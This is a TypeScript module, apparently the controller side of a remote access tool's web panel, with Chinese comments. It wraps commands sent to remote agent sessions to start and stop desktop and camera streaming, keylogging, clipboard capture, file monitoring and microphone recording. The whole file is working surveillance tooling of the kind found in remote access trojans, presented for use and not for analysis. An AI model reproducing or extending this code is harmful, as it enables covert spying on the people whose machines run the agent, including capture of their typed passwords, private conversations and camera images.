// 监控/流媒体域命令封装(移植自 cleat-web MonitorPage, 命令名对齐 Agent CmdDef.hpp):
//   桌面流   DesktopStreamStart / DesktopStreamStop
//   摄像头   CameraStreamStart / CameraStreamStop
//   键盘记录 KeylogStart / KeylogStop
//   剪贴板   ClipboardMonitorStart / ClipboardMonitorStop
//   文件监控 FileMonitorStart / FileMonitorStop
//   录音     AudioStartRecord / AudioStopRecord
// 帧数据不由这些命令回传, 走会话级 SSE(deskstream_data/camstream_data/audio_data 等)。
import { sendCommand } from './cleat-api'

/**
 * 流参数(与 Agent 服务解析对齐):
 * interval=帧间隔毫秒(桌面/摄像头均钳 100~60000), diff_enabled/full_frame_interval/diff_algorithm 差异帧可选。
 * 画质不在流级: 桌面固定 85, 摄像头读 capture.camera_quality(走 SetConfig)。
 */
export interface StreamStartOptions {
  interval?: number
  diff_enabled?: boolean
  full_frame_interval?: number
  diff_algorithm?: number
}

function streamParams(o?: StreamStartOptions): Record<string, unknown> {
  if (!o) return {}
  const p: Record<string, unknown> = {}
  if (o.interval !== undefined) p.interval = o.interval
  if (o.diff_enabled !== undefined) p.diff_enabled = o.diff_enabled
  if (o.full_frame_interval !== undefined) p.full_frame_interval = o.full_frame_interval
  if (o.diff_algorithm !== undefined) p.diff_algorithm = o.diff_algorithm
  return p
}

// ---- 桌面流 ----
export function startDesktopStream(sessionId: number, options?: StreamStartOptions) {
  return sendCommand(sessionId, 'DesktopStreamStart', streamParams(options))
}
export function stopDesktopStream(sessionId: number) {
  return sendCommand(sessionId, 'DesktopStreamStop')
}

// ---- 摄像头流 ----
export function startCameraStream(sessionId: number, options?: StreamStartOptions) {
  return sendCommand(sessionId, 'CameraStreamStart', streamParams(options))
}
export function stopCameraStream(sessionId: number) {
  return sendCommand(sessionId, 'CameraStreamStop')
}

// ---- 键盘记录 ----
export function startKeylog(sessionId: number, intervalMs = 2000) {
  return sendCommand(sessionId, 'KeylogStart', { interval: intervalMs })
}
export function stopKeylog(sessionId: number) {
  return sendCommand(sessionId, 'KeylogStop')
}

// ---- 剪贴板监控 ----
export function startClipboardMonitor(sessionId: number, intervalMs = 1000) {
  return sendCommand(sessionId, 'ClipboardMonitorStart', { interval_ms: intervalMs })
}
export function stopClipboardMonitor(sessionId: number) {
  return sendCommand(sessionId, 'ClipboardMonitorStop')
}

// ---- 文件监控 ----
export function startFileMonitor(sessionId: number, path: string, recursive = true) {
  return sendCommand(sessionId, 'FileMonitorStart', { path, recursive })
}
export function stopFileMonitor(sessionId: number) {
  return sendCommand(sessionId, 'FileMonitorStop')
}

// ---- 录音 ----
export function startAudioRecording(sessionId: number, intervalMs?: number) {
  return sendCommand(sessionId, 'AudioStartRecord', intervalMs ? { interval: intervalMs } : {})
}
export function stopAudioRecording(sessionId: number) {
  return sendCommand(sessionId, 'AudioStopRecord')
}
